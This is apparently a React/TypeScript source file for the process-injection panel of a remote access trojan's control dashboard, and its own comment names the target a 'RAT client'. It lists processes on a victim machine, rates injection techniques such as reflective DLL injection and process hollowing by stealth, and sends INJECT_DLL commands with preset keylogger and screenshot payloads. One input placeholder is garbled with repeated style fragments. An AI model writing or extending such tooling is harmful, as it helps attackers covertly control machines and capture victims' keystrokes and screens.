import { useState, useEffect, useMemo } from 'react';
import { useDashboardStore, type ProcessInfo as StoreProcessInfo } from '../store/dashboardStore.ts';
import { Button } from './Button';

export interface ProcessInfo {
  pid: number;
  name: string;
  sessionId: number;
  memoryUsage: number;
  threadCount: number;
  parentPid: number;
  architecture: 'x86' | 'x64' | 'Unknown';
  user: string;
  path: string;
}

export interface InjectionMethod {
  id: string;
  name: string;
  description: string;
  requiresAdmin: boolean;
  stealthLevel: 'Low' | 'Medium' | 'High';
}

export interface InjectionResult {
  success: boolean;
  pid: number;
  dllPath: string;
  method: string;
  threadId?: number;
  error?: string;
  timestamp: string;
}

export interface ProcessInjectionPanelProps {
  clientId?: string
  className?: string
  onSendCommand?: (command: string) => void
}

const INJECTION_METHODS: InjectionMethod[] = [
  {
    id: 'createremotethread',
    name: 'CreateRemoteThread',
    description: 'Standard DLL injection using CreateRemoteThread API',
    requiresAdmin: true,
    stealthLevel: 'Low'
  },
  {
    id: 'apcinjection',
    name: 'APC Injection',
    description: 'Queue APC in target thread for DLL loading',
    requiresAdmin: true,
    stealthLevel: 'Medium'
  },
  {
    id: 'setwindowshook',
    name: 'SetWindowsHook',
    description: 'Inject DLL via window message hooks',
    requiresAdmin: false,
    stealthLevel: 'Medium'
  },
  {
    id: 'reflective',
    name: 'Reflective DLL Injection',
    description: 'Load DLL from memory without touching disk',
    requiresAdmin: true,
    stealthLevel: 'High'
  },
  {
    id: 'processhollowing',
    name: 'Process Hollowing',
    description: 'Hollow out legitimate process and inject payload',
    requiresAdmin: true,
    stealthLevel: 'High'
  }
];

// Mock data for 

export default function ProcessInjectionPanel({ clientId, className = '', onSendCommand }: ProcessInjectionPanelProps) {
  const [selectedProcess, setSelectedProcess] = useState<ProcessInfo | null>(null);
  const [selectedMethod, setSelectedMethod] = useState<InjectionMethod>(INJECTION_METHODS[0]);
  const [dllPath, setDllPath] = useState('');
  const [customDll, setCustomDll] = useState<File | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isInjecting, setIsInjecting] = useState(false);
  const [injectionHistory, setInjectionHistory] = useState<InjectionResult[]>([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [showSystemProcesses, setShowSystemProcesses] = useState(false);
  const [autoRefresh, setAutoRefresh] = useState(true);
  
  const dashboardStore = useDashboardStore();
  
  // Get processes from dashboard store and convert to ProcessInfo format
  const processes = useMemo(() => {
    if (!clientId) return [];
    
    const storeProcesses = dashboardStore.getProcessList(clientId);
    if (!storeProcesses) return [];
    
    // Convert StoreProcessInfo to ProcessInfo
    return storeProcesses.map((p: StoreProcessInfo): ProcessInfo => ({
      pid: p.pid,
      name: p.name,
      sessionId: 1, // Default session ID
      memoryUsage: p.memory * 1024, // Convert KB to bytes
      threadCount: 0, // Not available in store
      parentPid: 0, // Not available in store
      architecture: p.architecture === 'x86' ? 'x86' : p.architecture === 'x64' ? 'x64' : 'Unknown',
      user: p.username,
      path: p.path
    }));
  }, [clientId, dashboardStore]);

  // Filtered processes based on search and system process filter
  const filteredProcesses = useMemo(() => {
    return processes.filter(process => {
      const matchesSearch = !searchTerm || 
        process.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
        process.pid.toString().includes(searchTerm) ||
        process.user.toLowerCase().includes(searchTerm.toLowerCase());
      
      const isSystemProcess = process.sessionId === 0 || process.user === 'SYSTEM' || process.user === 'LOCAL SERVICE' || process.user === 'NETWORK SERVICE';
      const matchesSystemFilter = showSystemProcesses || !isSystemProcess;
      
      return matchesSearch && matchesSystemFilter;
    });
  }, [processes, searchTerm, showSystemProcesses]);

  const loadProcesses = async () => {
    if (!clientId || !onSendCommand) return;
    
    setIsLoading(true);
    try {
      // Send PROCESS_LIST command to the backend
      onSendCommand('PROCESS_LIST');
    } catch (error) {
      console.error('Failed to load processes:', error);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    if (!autoRefresh || !clientId) return;
    
    const interval = setInterval(loadProcesses, 5000);
    loadProcesses();
    
    return () => clearInterval(interval);
  }, [autoRefresh, clientId, showSystemProcesses]);

  const handleDllUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file) return;
    
    if (!file.name.toLowerCase().endsWith('.dll')) {
      alert('Please select a DLL file');
      return;
    }
    
    setCustomDll(file);
    setDllPath(file.name);
  };

  const performInjection = async () => {
    if (!clientId || !selectedProcess || !dllPath) {
      alert('Please select a process and provide a DLL path');
      return;
    }
    
    setIsInjecting(true);
    
    try {
      // Send real injection command to the RAT client
      const injectCommand = `INJECT_DLL|${selectedProcess.pid}|${dllPath}|${selectedMethod.id}`;
      onSendCommand!(injectCommand);
      
      // Add to history as pending
      const result: InjectionResult = {
        success: false,
        pid: selectedProcess.pid,
        dllPath: dllPath,
        method: selectedMethod.id,
        error: 'Pending - waiting for response...',
        timestamp: new Date().toISOString()
      };
      
      setInjectionHistory(prev => [result, ...prev.slice(0, 9)]);
      
    } catch (error: any) {
      console.error('Injection failed:', error);
      alert(`Injection failed: ${error.message}`);
    } finally {
      setIsInjecting(false);
    }
  };

  const formatMemory = (bytes: number): string => {
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
    if (bytes < 1024 * 1024 * 1024) return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
    return `${(bytes / (1024 * 1024 * 1024)).toFixed(1)} GB`;
  };

  return (
    <div className={`process-injection-panel ${className}`} style={{
      display: 'flex',
      flexDirection: 'column',
      height: '100%',
      minHeight: 0,
      width: '100%',
      maxWidth: '100%',
      minWidth: 0,
      boxSizing: 'border-box',
      contain: 'layout paint',
      background: '#1a1a1a',
      color: '#fff',
      borderRadius: '8px',
      overflow: 'hidden',
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif"
    }}>
      <div className='bg-slate-950' style={{
        display: 'flex',
        justifyContent: 'space-between',
        flexWrap: 'wrap',
        alignItems: 'center',
        padding: '16px 20px',
        gap: '12px',
        overflow: 'hidden',
        borderBottom: '1px solid #444'
      }}>
        <h2 style={{ margin: 0, fontSize: '18px', fontWeight: 600 }}>Process Injection</h2>
        <div style={{ display: 'flex', gap: '12px', alignItems: 'center', flexWrap: 'wrap', minWidth: 0 }}>
          <Button 
            onClick={loadProcesses} 
            disabled={isLoading || !clientId}
            isLoading={isLoading}
            style={{
              padding: '8px 16px',
              background: '#4a4a4a',
              color: 'white',
              border: 'none',
              borderRadius: '0px',
              cursor: 'pointer',
              fontSize: '14px',
              opacity: isLoading || !clientId ? 0.5 : 1
            }}
          >
            {isLoading ? 'Loading...' : 'Refresh Processes'}
          </Button>
          
          <label style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '14px' }}>
            <input
              type="checkbox"
              checked={autoRefresh}
              onChange={(e) => setAutoRefresh(e.target.checked)}
            />
            Auto-refresh
          </label>
          
          <label style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '14px' }}>
            <input
              type="checkbox"
              checked={showSystemProcesses}
              onChange={(e) => setShowSystemProcesses(e.target.checked)}
            />
            Show System Processes
          </label>
        </div>
      </div>

      <div className='bg-slate-950' style={{
        display: 'flex',
        flex: 1,
        minHeight: 0,
        overflow: 'hidden'
      }}>
        {/* Left column: Process list */}
        <div style={{
          flex: 1,
          display: 'flex',
          flexDirection: 'column',
          borderRight: '1px solid #444',
          minHeight: 0,
          minWidth: 0,
          overflow: 'hidden'
        }}>
          <div style={{
            padding: '12px 16px',
            borderBottom: '1px solid #444',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            flexWrap: 'wrap',
            gap: '10px'
          }}>
            <h3 style={{ margin: 0, fontSize: '16px' }}>Running Processes ({filteredProcesses.length})</h3>
            <input
              type="text"
              placeholder="Search processes..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              style={{
                padding: '6px 10px',
                background: '#333',
                color: 'white',
                border: '1px solid #555',
                borderRadius: '0px',
                fontSize: '14px',
                width: '200px',
                maxWidth: '100%'
              }}
            />
          </div>
          
          <div className="scrollbar-hidden" style={{ flex: 1, minHeight: 0, overflowY: 'auto', overflowX: 'auto' }}>
            {filteredProcesses.length === 0 ? (
              <div style={{
                padding: '40px 20px',
                textAlign: 'center',
                color: '#888'
              }}>
                {isLoading ? 'Loading processes...' : 'No processes found'}
              </div>
            ) : (
              <table style={{ width: '100%', minWidth: '720px', borderCollapse: 'collapse' }}>
                <thead>
                  <tr style={{ background: '#2a2a2a' }}>
                    <th style={{ padding: '10px', textAlign: 'left', borderBottom: '1px solid #444' }}>PID</th>
                    <th style={{ padding: '10px', textAlign: 'left', borderBottom: '1px solid #444' }}>Name</th>
                    <th style={{ padding: '10px', textAlign: 'left', borderBottom: '1px solid #444' }}>User</th>
                    <th style={{ padding: '10px', textAlign: 'left', borderBottom: '1px solid #444' }}>Memory</th>
                    <th style={{ padding: '10px', textAlign: 'left', borderBottom: '1px solid #444' }}>Arch</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredProcesses.map(process => (
                    <tr 
                      key={process.pid}
                      style={{
                        cursor: 'pointer',
                        background: selectedProcess?.pid === process.pid ? '#3a3a3a' : 'transparent',
                        borderBottom: '1px solid #333'
                      }}
                      onClick={() => setSelectedProcess(process)}
                    >
                      <td style={{ padding: '10px' }}>{process.pid}</td>
                      <td style={{ padding: '10px' }} title={process.path}>
                        {process.name}
                      </td>
                      <td style={{ padding: '10px' }}>{process.user}</td>
                      <td style={{ padding: '10px' }}>{formatMemory(process.memoryUsage)}</td>
                      <td style={{ padding: '10px' }}>{process.architecture}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>
        </div>

        {/* Right column: Injection controls */}
        <div style={{
          flex: 1,
          display: 'flex',
          flexDirection: 'column',
          minHeight: 0,
          minWidth: 0,
          overflow: 'hidden'
        }}>
          <div style={{
            padding: '12px 16px',
            borderBottom: '1px solid #444'
          }}>
            <h3 style={{ margin: 0, fontSize: '16px' }}>Injection Controls</h3>
            {selectedProcess && (
              <div style={{ marginTop: '8px', fontSize: '14px', color: '#aaa' }}>
                Selected: <strong style={{ color: '#fff' }}>{selectedProcess.name}</strong> (PID: {selectedProcess.pid})
              </div>
            )}
          </div>

          <div className="scrollbar-hidden" style={{ padding: '16px', flex: 1, minHeight: 0, overflowY: 'auto', overflowX: 'hidden' }}>
            {/* Injection method selection */}
            <div style={{ marginBottom: '20px' }}>
              <label style={{ display: 'block', marginBottom: '8px', fontSize: '14px', fontWeight: 500 }}>Injection Method</label>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '10px' }}>
                {INJECTION_METHODS.map(method => (
                  <div 
                    key={method.id}
                    style={{
                      padding: '12px',
                      background: selectedMethod.id === method.id ? '#111' : '#000',
                      border: selectedMethod.id === method.id ? '1px dashed #fff' : '1px dashed #444',
                      borderRadius: '0px',
                      cursor: 'pointer',
                      transition: 'all 0.2s'
                    }}
                    onClick={() => setSelectedMethod(method)}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                      <h4 style={{ margin: 0, fontSize: '14px', fontWeight: 600 }}>{method.name}</h4>
                      <span style={{
                        padding: '2px 6px',
                        fontSize: '11px',
                        borderRadius: '0px',
                        background: '#000',
                        border: '1px dashed ' + (method.stealthLevel === 'Low' ? '#e74c3c' : method.stealthLevel === 'Medium' ? '#f39c12' : '#27ae60'),
                        color: method.stealthLevel === 'Low' ? '#e74c3c' : method.stealthLevel === 'Medium' ? '#f39c12' : '#27ae60'
                      }}>
                        {method.stealthLevel}
                      </span>
                    </div>
                    <p style={{ margin: '8px 0', fontSize: '12px', color: '#aaa', lineHeight: 1.4 }}>
                      {method.description}
                    </p>
                    <div style={{ fontSize: '11px', color: method.requiresAdmin ? '#e74c3c' : '#27ae60' }}>
                      {method.requiresAdmin ? 'Admin Required' : 'No Admin Needed'}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* DLL selection */}
            <div style={{ marginBottom: '20px' }}>
              <label style={{ display: 'block', marginBottom: '8px', fontSize: '14px', fontWeight: 500 }}>DLL to Inject</label>
              <div>
                <div style={{ marginBottom: '10px' }}>
                  <input
                    type="text"
                    placeholder="C:background: !selectedProcess || !dllPath || isInjecting || !clientId ? '#000' : '#000'background: !selectedProcess || !dllPath || isInjecting || !clientId ? '#000' : '#000'pathbackground: !selectedProcess || !dllPath || isInjecting || !clientId ? '#000' : '#000'background: !selectedProcess || !dllPath || isInjecting || !clientId ? '#000' : '#000'tobackground: !selectedProcess || !dllPath || isInjecting || !clientId ? '#000' : '#000'background: !selectedProcess || !dllPath || isInjecting || !clientId ? '#000' : '#000'payload.dll"
                    value={dllPath}
                    onChange={(e) => setDllPath(e.target.value)}
                    disabled={!!customDll}
                    style={{
                      width: '100%',
                      padding: '10px',
                      background: '#000',
                      color: 'white',
                      border: '1px dashed #fff',
                      borderRadius: '0px',
                      fontSize: '14px',
                      marginBottom: '10px'
                    }}
                  />
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <input
                      type="file"
                      id="dll-upload"
                      accept=".dll"
                      onChange={handleDllUpload}
                      style={{ display: 'none' }}
                    />
                    <label htmlFor="dll-upload" style={{
                      padding: '8px 16px',
                      background: '#000',
                      color: 'white',
                      border: '1px dashed #fff',
                      borderRadius: '0px',
                      cursor: 'pointer',
                      fontSize: '14px',
                      display: 'inline-block'
                    }}>
                      Upload DLL
                    </label>
                    {customDll && (
                      <span style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px',
                        padding: '6px 12px',
                        background: '#000',
                        border: '1px dashed #fff',
                        borderRadius: '0px',
                        fontSize: '14px'
                      }}>
                        {customDll.name}
                        <button 
                          onClick={() => {
                            setCustomDll(null);
                            setDllPath('');
                          }}
                          style={{
                            background: 'none',
                            border: 'none',
                            color: '#fff',
                            cursor: 'pointer',
                            fontSize: '18px',
                            padding: '0 4px'
                          }}
                        >
                          ×
                        </button>
                      </span>
                    )}
                  </div>
                </div>
                
                <div style={{ marginTop: '10px' }}>
                  <p style={{ margin: '0 0 8px 0', fontSize: '13px', color: '#aaa' }}>Predefined Payloads:</p>
                  <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                    <button 
                      onClick={() => setDllPath('C:\\\\Windows\\\\System32\\\\user32.dll')}
                      style={{
                        padding: '6px 12px', background: '#000', color: 'white', border: '1px dashed #fff', borderRadius: '0px',
                        cursor: 'pointer',
                        fontSize: '13px'
                      }}
                    >
                      user32.dll
                    </button>
                    <button 
                      onClick={() => setDllPath('C:\\\\Windows\\\\System32\\\\kernel32.dll')}
                      style={{
                        padding: '6px 12px', background: '#000', color: 'white', border: '1px dashed #fff', borderRadius: '0px',
                        cursor: 'pointer',
                        fontSize: '13px'
                      }}
                    >
                      kernel32.dll
                    </button>
                    <button 
                      onClick={() => setDllPath('payloads\\\\keylogger.dll')}
                      style={{
                        padding: '6px 12px', background: '#000', color: 'white', border: '1px dashed #fff', borderRadius: '0px',
                        cursor: 'pointer',
                        fontSize: '13px'
                      }}
                    >
                      Keylogger DLL
                    </button>
                    <button 
                      onClick={() => setDllPath('payloads\\\\screenshot.dll')}
                      style={{
                        padding: '6px 12px', background: '#000', color: 'white', border: '1px dashed #fff', borderRadius: '0px',
                        cursor: 'pointer',
                        fontSize: '13px'
                      }}
                    >
                      Screenshot DLL
                    </button>
                  </div>
                </div>
              </div>
            </div>

            {/* Injection button */}
            <div style={{ marginBottom: '20px' }}>
              <Button
                onClick={performInjection}
                disabled={!selectedProcess || !dllPath || isInjecting || !clientId}
                isLoading={isInjecting}
                style={{
                  width: '100%',
                  padding: '12px',
                  background: !selectedProcess || !dllPath || isInjecting || !clientId ? '#333' : '#4a90e2',
                  color: 'white',
                  border: '1px dashed #fff', borderRadius: '0px',
                  cursor: !selectedProcess || !dllPath || isInjecting || !clientId ? 'not-allowed' : 'pointer',
                  fontSize: '16px',
                  fontWeight: 600,
                  opacity: !selectedProcess || !dllPath || isInjecting || !clientId ? 0.5 : 1
                }}
              >
                {isInjecting ? 'Injecting...' : `Inject using ${selectedMethod.name}`}
              </Button>
              
              <div style={{ marginTop: '10px', fontSize: '13px', color: '#aaa' }}>
                {selectedMethod.requiresAdmin && (
                  <div style={{ color: '#e74c3c', marginBottom: '4px' }}>⚠️ Requires Administrator privileges</div>
                )}
                <div>
                  Stealth level: <strong>{selectedMethod.stealthLevel}</strong>
                </div>
              </div>
            </div>

            {/* Injection history */}
            {injectionHistory.length > 0 && (
              <div>
                <h4 style={{ margin: '0 0 10px 0', fontSize: '15px' }}>Recent Injections</h4>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {injectionHistory.map((result, index) => (
                    <div key={index} style={{
                      padding: '10px',
                      background: result.success ? 'rgba(39, 174, 96, 0.1)' : 'rgba(231, 76, 60, 0.1)',
                      border: `1px solid ${result.success ? '#27ae60' : '#e74c3c'}`,
                      borderRadius: '0px'
                    }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                        <span style={{ fontSize: '13px', fontWeight: 500 }}>PID: {result.pid}</span>
                        <span style={{ fontSize: '12px', color: '#aaa' }}>{result.method}</span>
                        <span style={{ fontSize: '12px', color: '#aaa' }}>
                          {new Date(result.timestamp).toLocaleTimeString()}
                        </span>
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <span style={{ fontSize: '12px', color: '#aaa' }} title={result.dllPath}>
                          {result.dllPath.split('\\').pop()}
                        </span>
                        {result.success ? (
                          <span style={{ color: '#27ae60', fontSize: '12px', fontWeight: 500 }}>✓ Success</span>
                        ) : (
                          <span style={{ color: '#e74c3c', fontSize: '12px' }}>✗ Failed: {result.error}</span>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
